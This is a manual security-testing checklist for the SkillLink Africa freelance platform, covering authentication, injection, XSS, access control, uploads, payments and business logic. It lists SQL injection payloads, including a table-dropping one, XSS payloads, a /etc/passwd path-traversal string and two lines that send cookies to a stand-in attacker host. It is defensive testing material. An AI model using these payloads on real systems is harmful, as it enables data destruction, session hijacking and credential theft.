# SkillLink Africa - Security Testing Checklist

A comprehensive manual penetration testing guide for identifying security vulnerabilities.

---

## 🔐 1. Authentication & Session Security

### 1.1 Login Security
- [ ] Test login with SQL injection payloads: `' OR '1'='1`, `admin'--`, `' OR 1=1--`
- [ ] Test login with empty credentials
- [ ] Test login with extremely long passwords (>1000 chars)
- [ ] Test login with special characters: `<script>alert(1)</script>`
- [ ] Verify account lockout after failed attempts (should lock after 5-10 attempts)
- [ ] Check if error messages reveal user existence ("Invalid password" vs "User not found")
- [ ] Test password reset with non-existent emails
- [ ] Verify password reset tokens expire properly

### 1.2 Session Management
- [ ] Check if session tokens are invalidated after logout
- [ ] Test session fixation (using old session after login)
- [ ] Verify sessions expire after inactivity
- [ ] Check for secure cookie flags (HttpOnly, Secure, SameSite)
- [ ] Test concurrent sessions handling
- [ ] Verify JWT tokens have reasonable expiration

### 1.3 Registration Security
- [ ] Test signup with already registered email
- [ ] Test signup with malicious email: `test@test.com<script>`
- [ ] Verify email validation is enforced
- [ ] Test password strength requirements
- [ ] Check for username enumeration via registration

---

## 🛡️ 2. SQL Injection Testing

### 2.1 Input Fields to Test
Test these payloads in ALL input fields:

```
' OR '1'='1
' OR '1'='1'--
'; DROP TABLE users;--
1' AND '1'='1
' UNION SELECT null,null,null--
1; SELECT * FROM users
' OR 'x'='x
admin'--
') OR ('1'='1
```

### 2.2 Critical Areas to Test
- [ ] Job search field
- [ ] Profile bio/description fields
- [ ] Job title and description fields
- [ ] Chat message input
- [ ] Application proposal text
- [ ] Contract terms field
- [ ] Filter parameters (budget, skills, location)
- [ ] URL parameters (job ID, user ID, etc.)

### 2.3 Time-Based Blind SQL Injection
```
'; WAITFOR DELAY '0:0:5'--
' OR SLEEP(5)--
1' AND SLEEP(5)--
```

---

## ⚠️ 3. Cross-Site Scripting (XSS) Testing

### 3.1 Basic XSS Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
javascript:alert('XSS')
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### 3.2 Areas to Test for XSS
- [ ] User profile name and bio
- [ ] Job titles and descriptions
- [ ] Company name and description
- [ ] Chat messages
- [ ] Review text
- [ ] Portfolio titles and descriptions
- [ ] Service listing titles
- [ ] Search queries (reflected XSS)
- [ ] URL parameters

### 3.3 Advanced XSS Payloads
```html
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
<svg/onload=alert('XSS')>
<img """><script>alert("XSS")</script>">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

---

## 🔓 4. Authorization & Access Control

### 4.1 Horizontal Privilege Escalation
- [ ] Access other users' profiles by changing user ID in URL
- [ ] View other users' applications by modifying application ID
- [ ] Access other users' contracts by changing contract ID
- [ ] Read other users' messages by modifying conversation ID
- [ ] View other users' wallet/transactions

### 4.2 Vertical Privilege Escalation
- [ ] Access admin dashboard as regular user (`/admin/*` routes)
- [ ] Perform admin actions (verify employers, approve jobs)
- [ ] Access employer functions as talent (post jobs, manage applications)
- [ ] Access talent functions as employer (apply to jobs)
- [ ] Modify user roles without admin privileges

### 4.3 IDOR (Insecure Direct Object Reference)
Test by modifying IDs in:
- [ ] `/job/{job_id}` - View unauthorized jobs
- [ ] `/profile/{user_id}` - View unauthorized profiles
- [ ] `/contract/{contract_id}` - View unauthorized contracts
- [ ] `/application/{application_id}` - View unauthorized applications
- [ ] `/chat/{room_id}` - Access unauthorized chat rooms

---

## 📁 5. File Upload Security

### 5.1 Portfolio/Document Uploads
- [ ] Upload executable files (.exe, .bat, .sh)
- [ ] Upload files with double extensions (image.jpg.php)
- [ ] Upload oversized files (>100MB)
- [ ] Upload files with null bytes (image.php%00.jpg)
- [ ] Test MIME type bypass
- [ ] Upload SVG with embedded JavaScript
- [ ] Upload HTML files

### 5.2 Profile Image Uploads
- [ ] Upload non-image files
- [ ] Upload images with embedded malware
- [ ] Upload extremely large images
- [ ] Test path traversal (../../../etc/passwd)

---

## 🌐 6. API Security

### 6.1 Rate Limiting
- [ ] Test login endpoint for brute force protection
- [ ] Test registration endpoint for spam protection
- [ ] Test job search for abuse prevention
- [ ] Test message sending rate limits
- [ ] Test password reset rate limiting

### 6.2 API Authentication
- [ ] Access API endpoints without authentication
- [ ] Use expired tokens
- [ ] Modify JWT payload without re-signing
- [ ] Test with invalid API keys
- [ ] Check for API key exposure in client-side code

### 6.3 API Input Validation
- [ ] Send malformed JSON
- [ ] Send extremely large payloads
- [ ] Send unexpected data types
- [ ] Test with negative numbers where positive expected
- [ ] Test with special characters in all fields

---

## 💳 7. Payment Security

### 7.1 Transaction Manipulation
- [ ] Modify payment amounts in requests
- [ ] Replay payment confirmation requests
- [ ] Test negative payment amounts
- [ ] Test extremely large payment amounts
- [ ] Manipulate currency values
- [ ] Test milestone amount tampering

### 7.2 Escrow System
- [ ] Release escrow without authorization
- [ ] Cancel funded contracts improperly
- [ ] Modify milestone amounts after creation
- [ ] Test double-spending scenarios

---

## 🔍 8. Information Disclosure

### 8.1 Error Messages
- [ ] Trigger server errors and check for stack traces
- [ ] Check for database error messages
- [ ] Verify no sensitive data in error responses
- [ ] Check 404 pages for information leakage

### 8.2 Source Code & Configuration
- [ ] Check for exposed .env files
- [ ] Check for exposed .git directories
- [ ] Look for API keys in JavaScript files
- [ ] Check for sensitive comments in source code
- [ ] Verify no hardcoded credentials

### 8.3 Headers & Cookies
- [ ] Check for missing security headers (X-Frame-Options, CSP, etc.)
- [ ] Verify CORS configuration
- [ ] Check for sensitive data in cookies
- [ ] Verify cookie security flags

---

## 🛠️ 9. Business Logic Flaws

### 9.1 Job Application Logic
- [ ] Apply to own job posting
- [ ] Apply multiple times to same job
- [ ] Apply to closed/cancelled jobs
- [ ] Accept application without proper authorization

### 9.2 Contract Logic
- [ ] Create contract without accepted application
- [ ] Complete milestones out of order
- [ ] Approve own deliverables
- [ ] Cancel completed contracts

### 9.3 Review System
- [ ] Leave review without completed contract
- [ ] Review yourself
- [ ] Multiple reviews for same contract
- [ ] Modify review after submission

---

## 📋 10. Testing Tools & Commands

### Browser Developer Tools
```javascript
// Check localStorage for sensitive data
console.log(localStorage);

// Check sessionStorage
console.log(sessionStorage);

// Check cookies
console.log(document.cookie);

// Monitor network requests
// Use Network tab to inspect API calls
```

### Useful Browser Extensions
- OWASP ZAP (Proxy)
- Burp Suite Community
- Wappalyzer (Technology detection)
- Cookie Editor
- ModHeader

### Testing Checklist Summary

| Category | Priority | Status |
|----------|----------|--------|
| Authentication | Critical | ⬜ |
| SQL Injection | Critical | ⬜ |
| XSS | High | ⬜ |
| Access Control | Critical | ⬜ |
| File Upload | High | ⬜ |
| API Security | High | ⬜ |
| Payment Security | Critical | ⬜ |
| Information Disclosure | Medium | ⬜ |
| Business Logic | Medium | ⬜ |

---

## 📝 Reporting Template

When you find a vulnerability, document it:

```
### Vulnerability Title

**Severity:** Critical/High/Medium/Low
**Category:** [SQL Injection/XSS/Access Control/etc.]
**Location:** [URL/Endpoint/Feature]

**Description:**
[Detailed description of the vulnerability]

**Steps to Reproduce:**
1. Step 1
2. Step 2
3. Step 3

**Expected Result:**
[What should happen]

**Actual Result:**
[What actually happens]

**Proof of Concept:**
[Screenshot or code]

**Recommended Fix:**
[How to fix the issue]
```

---

## ✅ Quick Security Checks

Run these checks regularly:

1. **Console Check:** Open browser console, look for errors exposing sensitive info
2. **Network Tab:** Monitor API calls for sensitive data in responses
3. **Storage Check:** Inspect localStorage/sessionStorage for sensitive data
4. **URL Check:** Try modifying IDs in URLs to access other users' data
5. **Form Check:** Test all forms with XSS and SQL injection payloads

---

*Last Updated: December 2024*
*For SkillLink Africa Platform*
